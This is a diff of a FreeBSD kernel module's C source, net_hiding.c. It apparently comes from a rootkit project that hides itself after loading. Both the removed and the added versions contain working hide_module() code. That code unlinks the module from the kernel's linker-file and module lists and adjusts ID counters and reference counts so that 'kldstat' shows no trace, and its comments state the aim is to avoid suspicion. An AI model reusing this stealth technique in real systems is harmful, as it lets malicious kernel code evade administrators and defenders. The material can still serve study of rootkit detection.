@@ -1,121 +1,104 @@
-#include <sys/types.h>
-#include <sys/param.h>
-#include <sys/proc.h>
-#include <sys/module.h>
-#include <sys/sysent.h>
-#include <sys/kernel.h>
-#include <sys/systm.h>
-#include <sys/linker.h>
-#include <sys/sysproto.h>
-#include <sys/proc.h>
-#include <sys/syscall.h>
-#include <sys/file.h>
-#include <sys/malloc.h>
-#include <sys/lock.h>
-#include <sys/lockmgr.h>
-#include <sys/mutex.h>
+/*
+ * =====================================================================================
+ *
+ *       Filename:  net_hiding.c
+ *
+ *    Description:  Network & Module Hiding
+ *
+ *        Version:  1.0
+ *        Created:  22/06/2011 01:13:16
+ *       Revision:  none
+ *       Compiler:  gcc
+ *
+ *         Author:  Steffen L. Norgren (http://trollop.org), ironix@trollop.org
+ *        Company:  Esurient Systems Inc.
+ *
+ * =====================================================================================
+ */
+#include "net_hiding.h"
 
-/* function prototypes (MOVE TO HEADER) */
-static int net_hiding(struct thread *, void *);
-static void print_status(void);
-static void hide_module(void);
+static void hide_module(void)
+{
+    struct linker_file *lf;
+    struct module *mod;
 
-typedef TAILQ_HEAD(, module) modulelist_t;
+    /* Giant lock is used in the kernel to provice concurrency control */
+    mtx_lock(&Giant);
+    sx_xlock(&kld_sx);
 
-extern linker_file_list_t linker_files;	/* patch the linker_files list */
-extern int next_file_id;
-extern modulelist_t modules;		/* patch the module list */
-extern int nextid;
+    /*
+     * Decrement the current kernel image's reference count. This reduces suspicion
+     * when executing 'kldstat', for if another kernel module is loaded, there will
+     * be a gap in the list of ids.
+     */
+    (&linker_files)->tqh_first->refs--;
 
-struct module {
-	TAILQ_ENTRY(module) link;
-	TAILQ_ENTRY(module) flink;
-	struct linker_file *file;
-	int refs;
-	int id;
-	char *name;
-	modeventhand_t handler;
-	void *arg;
-	modspecific_t data;
+    /*
+     * Iterate throught he linker_files list, looking for MODULE_FILE. If found,
+     * decrement the next_file_id and remove from the list.
+     */
+    TAILQ_FOREACH(lf, &linker_files, link) {
+        if (strcmp(lf->filename, MODULE_FILE) == 0) {
+            next_file_id--;
+            TAILQ_REMOVE(&linker_files, lf, link);
+            break;
+        }
+    }
+
+    sx_xunlock(&kld_sx);
+    mtx_unlock(&Giant);
+
+    /* 
+     * Shared/exclusive locks are used to protect data that are read far more
+     * often than they are written.
+     */
+    sx_xlock(&modules_sx);
+
+    /*
+     * Iterate through the module list, looking for MODULE_NAME. If found,
+     * decrement nextid and remove from the list.
+     */
+    TAILQ_FOREACH(mod, &modules, link) {
+        if (strcmp(mod->name, MODULE_NAME) == 0) {
+            nextid--;
+            TAILQ_REMOVE(&modules, mod, link);
+            break;
+        }
+    }
+
+    sx_xunlock(&modules_sx);
+}
+
+static int module_events(struct module *module, int cmd, void *arg)
+{
+    int error = 0;
+
+    switch (cmd) {
+        case MOD_LOAD:
+            uprintf("Module %s loaded.\n", MODULE_FILE);
+
+            if (MODULE_HIDE) {
+                uprintf("Hiding %s module.\n", MODULE_FILE);
+                hide_module();
+            }
+            break;
+
+        case MOD_UNLOAD:
+            uprintf("Module %s unloaded.\n", MODULE_FILE);
+            break;
+
+        default:
+            error = EOPNOTSUPP;
+            break;
+    }
+
+    return error;
+}
+
+static moduledata_t net_hiding_mod = {
+    MODULE_NAME,    /* module name */
+    module_events,  /* event handler */
+    NULL            /* extra data */
 };
 
-char string[] = "net_hiding module.";
-
-/* this is only to show that the extern functions are working */
-static void print_status() {
-	uprintf("IT WORKS : %s\n", string);
-}
-
-/* This function only checks that the module is still working. */
-static int net_hiding(struct thread *t, void *arg) {
-	uprintf("SYSCALL was ESTABLISHED and is still in memory.\n");
-	print_status();
-	return 0;
-}
-
-/* The 'sysent' for the new syscall */
-static struct sysent net_hiding_sysent = {
-	0,			/* sy_narg */
-	net_hiding /* sy_call */
-};
-
-/* The offset in sysent where the syscall is allocated. */
-static int offset = NO_SYSCALL;	/* NO_SYSCALL = 'let the kernel decide' */
-
-/* Hide the module */
-static void hide_module() {
-	linker_file_t lf = 0;
-	module_t mod = 0;
-
-	/* NOTE: The first linker file is the current kernel image (/kernel for example).
-	   If we load our module we will increase the reference count of the kernel
-	   link file. This might be a but suspect, so we must patch this. */
-
-	(&linker_files)->tqh_first->refs--;
-	for (lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
-		if (!strcmp(lf->filename, "net_hiding.ko")) {
-			next_file_id--; /* decrement the global link file counter */
-
-			/* remove the entry */
-			if (((lf)->link.tqe_next) != NULL)
-				(lf)->link.tqe_next->link.tqe_prev = (lf)->link.tqe_prev;
-			else
-				(&linker_files)->tqh_last = (lf)->link.tqe_prev;
-
-			*(lf)->link.tqe_prev = (lf)->link.tqe_next;
-
-			break;
-		}
-	}
-
-	for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
-		if (!strcmp(mod->name, "net_hiding")) {
-			/* patch the internel ID counter */
-			nextid--;
-
-			TAILQ_REMOVE(&modules, mod, link);
-		}
-	}
-}
-
-/* This function is called at load/unload */
-static int event_handler(struct module *module, int event, void *arg) {
-	int e = 0; /* Error, 0 for normal return status */
-
-	switch (event) {
-		case MOD_LOAD:
-			uprintf("The module has been loaded!\n");
-			hide_module();
-			break;
-		case MOD_UNLOAD:
-			uprintf("The module has been unloaded.\n");
-			break;
-		default:
-			e = EOPNOTSUPP; /* Error, operation not supported */
-			break;
-	}
-
-	return(e);
-}
-
-SYSCALL_MODULE(net_hiding, &offset, &net_hiding_sysent, event_handler, NULL);
+DECLARE_MODULE(net_hiding, net_hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
